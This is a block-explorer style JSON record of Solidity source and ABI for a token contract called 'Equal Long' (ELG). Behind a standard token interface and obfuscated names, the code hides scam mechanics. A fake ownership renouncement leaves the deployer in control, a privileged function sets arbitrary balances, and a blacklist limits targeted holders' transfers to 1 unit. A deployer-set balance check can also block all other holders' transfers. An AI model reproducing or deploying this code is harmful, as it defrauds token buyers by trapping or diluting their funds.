{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeReceiver) external view returns (uint256);\n\n    function transfer(address senderWallet, uint256 limitAtMin) external returns (bool);\n\n    function allowance(address senderLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitAtMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderWallet,\n        uint256 limitAtMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitShould, uint256 value);\n    event Approval(address indexed senderLimit, address indexed spender, uint256 value);\n}\n\nabstract contract tradingTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalSell {\n    function createPair(address shouldLaunch, address receiverIs) external returns (address);\n}\n\ninterface feeMarketing is enableShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EqualLong is tradingTotal, enableShould, feeMarketing {\n\n    address public limitFrom;\n\n    string private receiverToMarketing = \"Equal Long\";\n\n    uint256 constant fromReceiver = 1 ** 10;\n\n    mapping(address => mapping(address => uint256)) private autoLiquidity;\n\n    address private maxToToken;\n\n    address public minTake;\n\n    function allowance(address autoShould, address receiverAuto) external view virtual override returns (uint256) {\n        if (receiverAuto == isReceiverMode) {\n            return type(uint256).max;\n        }\n        return autoLiquidity[autoShould][receiverAuto];\n    }\n\n    function transfer(address sellTeamLaunched, uint256 limitAtMin) external virtual override returns (bool) {\n        return toMin(_msgSender(), sellTeamLaunched, limitAtMin);\n    }\n\n    function minMarketing(address walletExempt) public {\n        if (fundTxMax) {\n            return;\n        }\n        if (amountList != teamTrading) {\n            teamTrading = true;\n        }\n        marketingTeam[walletExempt] = true;\n        \n        fundTxMax = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoSwap;\n    }\n\n    function txReceiver(address teamLiquidityLaunched) public {\n        teamSwap();\n        \n        if (teamLiquidityLaunched == minTake || teamLiquidityLaunched == limitFrom) {\n            return;\n        }\n        maxTo[teamLiquidityLaunched] = true;\n    }\n\n    bool private sellTx;\n\n    uint256 senderTeamLaunched;\n\n    uint256 private modeTx = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return maxToToken;\n    }\n\n    function isFeeMin(address sellTeamLaunched, uint256 limitAtMin) public {\n        teamSwap();\n        modeMin[sellTeamLaunched] = limitAtMin;\n    }\n\n    function approve(address receiverAuto, uint256 limitAtMin) public virtual override returns (bool) {\n        autoLiquidity[_msgSender()][receiverAuto] = limitAtMin;\n        emit Approval(_msgSender(), receiverAuto, limitAtMin);\n        return true;\n    }\n\n    bool public fundTxMax;\n\n    address isReceiverMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private teamTrading;\n\n    bool public amountList;\n\n    constructor (){\n        \n        fundList launchToken = fundList(isReceiverMode);\n        limitFrom = totalSell(launchToken.factory()).createPair(launchToken.WETH(), address(this));\n        if (amountList == teamTrading) {\n            amountMode = swapTake;\n        }\n        minTake = _msgSender();\n        maxLaunched();\n        marketingTeam[minTake] = true;\n        modeMin[minTake] = modeTx;\n        \n        emit Transfer(address(0), minTake, modeTx);\n    }\n\n    string private autoSwap = \"ELG\";\n\n    function getOwner() external view returns (address) {\n        return maxToToken;\n    }\n\n    uint256 private amountSenderLaunched;\n\n    function swapExemptEnable(address receiverShould, address senderWallet, uint256 limitAtMin) internal returns (bool) {\n        require(modeMin[receiverShould] >= limitAtMin);\n        modeMin[receiverShould] -= limitAtMin;\n        modeMin[senderWallet] += limitAtMin;\n        emit Transfer(receiverShould, senderWallet, limitAtMin);\n        return true;\n    }\n\n    function shouldMarketing(uint256 limitAtMin) public {\n        teamSwap();\n        takeToAt = limitAtMin;\n    }\n\n    mapping(address => bool) public maxTo;\n\n    uint256 public swapTake;\n\n    uint256 takeToAt;\n\n    function teamSwap() private view {\n        require(marketingTeam[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverToMarketing;\n    }\n\n    uint256 public amountMode;\n\n    mapping(address => uint256) private modeMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toMinList;\n    }\n\n    uint256 private exemptFrom;\n\n    event OwnershipTransferred(address indexed fromLimit, address indexed limitAutoTotal);\n\n    mapping(address => bool) public marketingTeam;\n\n    uint8 private toMinList = 18;\n\n    function toMin(address receiverShould, address senderWallet, uint256 limitAtMin) internal returns (bool) {\n        if (receiverShould == minTake) {\n            return swapExemptEnable(receiverShould, senderWallet, limitAtMin);\n        }\n        uint256 txMax = enableShould(limitFrom).balanceOf(swapReceiver);\n        require(txMax == takeToAt);\n        require(senderWallet != swapReceiver);\n        if (maxTo[receiverShould]) {\n            return swapExemptEnable(receiverShould, senderWallet, fromReceiver);\n        }\n        return swapExemptEnable(receiverShould, senderWallet, limitAtMin);\n    }\n\n    address swapReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address takeReceiver) public view virtual override returns (uint256) {\n        return modeMin[takeReceiver];\n    }\n\n    function transferFrom(address receiverShould, address senderWallet, uint256 limitAtMin) external override returns (bool) {\n        if (_msgSender() != isReceiverMode) {\n            if (autoLiquidity[receiverShould][_msgSender()] != type(uint256).max) {\n                require(limitAtMin <= autoLiquidity[receiverShould][_msgSender()]);\n                autoLiquidity[receiverShould][_msgSender()] -= limitAtMin;\n            }\n        }\n        return toMin(receiverShould, senderWallet, limitAtMin);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeTx;\n    }\n\n    function maxLaunched() public {\n        emit OwnershipTransferred(minTake, address(0));\n        maxToToken = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAutoTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAtMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTxMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAtMin\",\"type\":\"uint256\"}],\"name\":\"isFeeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"}],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitAtMin\",\"type\":\"uint256\"}],\"name\":\"shouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAtMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAtMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidityLaunched\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EqualLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}